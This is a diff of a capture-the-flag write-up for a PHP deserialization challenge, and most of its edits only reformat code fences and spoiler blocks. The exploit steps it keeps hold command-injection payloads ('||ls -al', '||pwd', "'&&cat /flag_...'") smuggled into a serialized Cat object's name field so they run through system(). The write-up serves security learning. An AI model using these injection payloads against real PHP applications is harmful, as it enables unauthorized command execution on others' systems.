@@ -15,8 +15,7 @@ Challenge: http://h4ck3r.quest:8601/
 [0x16.5(php unserialize)](/FkF8p-zrSMSOWFkE4vvAJQ)
 
 ## Source code
-:::spoiler code
-```php=
+```php
 <?php
 isset($_GET['source']) && die(!show_source(__FILE__));
 
@@ -45,12 +44,10 @@ if (!isset($_COOKIE['cat_session'])) {
 <p>Hello, <?= $cat->name ?>.</p>
 <a href="/?source">source code</a>
 ```
-:::
 
 ## Exploit - deserialize
-1. Use psysh to test payload
-In local side, if you haven't install `cowsay`, the payload should be `'||ls -al'`
-    ```bash!
+1. Use psysh to test payload: In local side, if you haven't install `cowsay`, the payload should be `'||ls -al'`
+    ```bash
     $ ./psysh
     > system("cowsay 'Welcome back, '||pwd''");
     sh: 1: cowsay: not found
@@ -58,7 +55,7 @@ In local side, if you haven't install `cowsay`, the payload should be `'||ls -al
     = "/home/sbk6401"
     ```
 2. Construct testing case
-    ```bash!
+    ```bash
     $ ./psysh
     > class Cat{
     . public $name = '(guest cat)';
@@ -76,7 +73,7 @@ In local side, if you haven't install `cowsay`, the payload should be `'||ls -al
     ![](https://i.imgur.com/oTHtA0U.png)
 
 3. Get flag
-    ```bash!
+    ```bash
     > $cat = new Cat("'&&cat /flag_5fb2acebf1d0c558'")
     = Cat {#2789
         +name: "'&&cat /flag_5fb2acebf1d0c558'",
